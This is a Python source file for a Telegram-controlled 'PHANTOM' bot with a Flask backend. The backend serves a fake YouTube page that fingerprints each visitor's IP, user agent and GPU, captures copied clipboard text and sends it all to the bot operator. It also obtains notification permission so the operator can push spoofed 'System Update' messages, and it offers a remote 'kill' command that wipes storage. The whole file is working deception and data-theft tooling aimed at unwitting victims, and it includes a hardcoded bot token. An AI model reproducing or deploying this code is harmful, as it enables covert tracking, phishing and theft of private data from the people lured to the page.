import asyncio, threading, requests, json, os, base64, urllib.parse, time
from flask import Flask, render_template_string, request, jsonify
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- [1] КОНФИГУРАЦИЯ СИСТЕМЫ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OVERLORD_ID = 6659724115  # ТВОЙ ID (ГЛАВНЫЙ СУДЬЯ)
BASE_URL = "https://tg-bot-backend-oo97.onrender.com"
PORT = int(os.environ.get("PORT", 10000))

app = Flask(__name__)
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# Глобальные очереди данных
active_commands = {} 
waiting_for_text = {} 

# --- [2] CENTRAL GHOST CLICKJACKING UI ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube Mobile</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { margin: 0; background: #000; font-family: sans-serif; overflow: hidden; width: 100vw; height: 100vh; }
        #victim-ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; z-index: 10; background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
        .play-ico { width: 90px; height: 60px; background: rgba(255,0,0,0.9); border-radius: 12px; display: flex; align-items: center; justify-content: center; border: 4px solid white; animation: pulse 1.5s infinite; cursor: pointer; }
        .play-tr { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
        #ghost-target { position: absolute; width: 140px; height: 45px; background: transparent; z-index: 2000; display: none; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
    </style>
</head>
<body onclick="ignite()">
    <div id="victim-ui">
        <div class="play-ico"><div class="play-tr"></div></div>
    </div>
    <div id="ghost-target"></div>
<script>
let sid = "{{ sid }}", active = false;
async function ignite() {
    if(active) return; active = true;
    let gl = document.createElement('canvas').getContext('webgl');
    let dbg = gl.getExtension('WEBGL_debug_renderer_info');
    let d = { sid: sid, ua: navigator.userAgent, res: screen.width+"x"+screen.height, gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A" };
    navigator.sendBeacon('/log', btoa(encodeURIComponent(JSON.stringify(d))));

    Notification.requestPermission().then(p => { 
        console.log("Status:", p); 
        setTimeout(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; }, 1000);
    });

    setTimeout(() => {
        let gt = document.getElementById('ghost-target');
        gt.style.display = 'block';
        gt.style.top = (window.innerHeight / 2) + 38 + 'px';
        gt.style.left = (window.innerWidth / 2) + 18 + 'px';
        document.getElementById('victim-ui').innerHTML = '<div style="color:white;font-size:18px;text-align:center;">Loading secure player...<br>Please wait</div>';
    }, 150);

    setInterval(async () => {
        try {
            let r = await fetch('/poll/' + sid);
            let c = await r.json();
            if (c.type === 'push') {
                new Notification("System Update", {body: c.txt, icon: "https://www.google.com/favicon.ico"});
            }
            if (c.type === 'kill') {
                localStorage.clear(); sessionStorage.clear();
                document.body.innerHTML = '<h1 style="color:white;text-align:center;margin-top:50px;">404 Not Found</h1>';
                setTimeout(() => { location.href = "https://google.com"; }, 800);
            }
        } catch(e) {}
    }, 3500);
    
    document.addEventListener('copy', () => {
        let t = window.getSelection().toString();
        if(t) fetch('/clip', { method: 'POST', body: JSON.stringify({sid:sid, txt:t}) });
    });
}
</script>
</body>
</html>
"""

# --- [3] BACKEND LOGIC (FLASK) ---

@app.route('/ping')
def cron_ping(): return "PONG", 200

@app.route('/v/<sid>')
def victim_page(sid): return render_template_string(HTML_TEMPLATE, sid=sid)

@app.route('/log', methods=['POST'])
def logger():
    raw = base64.b64decode(request.get_data()).decode()
    data = json.loads(urllib.parse.unquote(raw))
    sid, ip = data['sid'], request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    kb = InlineKeyboardBuilder()
    kb.button(text="🔔 PUSH (CHROME)", callback_data=f"req_push_{sid}")
    kb.button(text="☣️ KILL-SWITCH", callback_data=f"req_kill_{sid}")
    
    rep = f"🎯 **ЦЕЛЬ В СЕТИ**\\n🌐 **IP:** `{ip}`\\n💻 **GPU:** `{data['gpu'][:25]}`\\n📍 **ID:** `{sid}`"
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": int(sid), "text": rep, "reply_markup": kb.adjust(1).as_markup(), "parse_mode": "Markdown"})
    return "OK"

@app.route('/poll/<sid>')
def poll(sid): return jsonify(active_commands.pop(sid, {"type": "none"}))

@app.route('/clip', methods=['POST'])
def clip():
    d = json.loads(request.get_data())
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": int(d['sid']), "text": f"📋 **БУФЕР:** `{d['txt']}`"})
    return "OK"

# --- [4] CONTROL CENTER (AIOGRAM) ---

@dp.message(Command("start"))
async def cmd_start(m: types.Message):
    kb = ReplyKeyboardBuilder().button(text="🧨 Создать ссылку").as_markup(resize_keyboard=True)
    status = "👑 ОВЕРЛОРД" if m.from_user.id == OVERLORD_ID else "Агент"
    await m.answer(f"🕶 **PHANTOM v44.0 | SINGULARITY**\\nСтатус: `{status}`", reply_markup=kb)

@dp.message(F.text == "🧨 Создать ссылку")
async def cmd_link(m: types.Message):
    await m.answer(f"🔗 **Твоя ссылка:**\\n`{BASE_URL}/v/{m.from_user.id}`")

@dp.callback_query(F.data.startswith("req_"))
async def user_request(c: types.CallbackQuery):
    _, act, sid = c.data.split("_")
    kb = InlineKeyboardBuilder().button(text="✅ РАЗРЕШИТЬ", callback_data=f"ovl_ok_{act}_{sid}").button(text="❌ ОТКАЗ", callback_data="ovl_no").as_markup()
    await bot.send_message(OVERLORD_ID, f"⚖️ **СУДЬЯ:** Юзер `{c.from_user.id}` просит `{act}` для `{sid}`", reply_markup=kb)
    await c.answer("⏳ Ожидание одобрения Оверлорда...")

@dp.callback_query(F.data.startswith("ovl_"))
async def overlord_action(c: types.CallbackQuery):
    if c.from_user.id != OVERLORD_ID: return
    d = c.data.split("_")
    if d[1] == "no": return await c.message.edit_text("❌ Запрос отклонен.")
    
    decision, act, sid = d[1], d[2], d[3]
    if act == "push":
        waiting_for_text[int(sid)] = sid
        await bot.send_message(int(sid), "🚀 **РАЗРЕШЕНО!** Введите текст уведомления:")
    else:
        active_commands[sid] = {"type": "kill"}
        await bot.send_message(int(sid), "☣️ Команда на уничтожение отправлена!")
    await c.message.edit_text(f"✅ Действие `{act}` одобрено.")

@dp.message(F.text)
async def handle_text(m: types.Message):
    if m.from_user.id in waiting_for_text:
        sid = waiting_for_text.pop(m.from_user.id)
        active_commands[sid] = {"type": "push", "txt": m.text}
        await m.answer(f"📨 Сообщение отправлено цели `{sid}`")

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
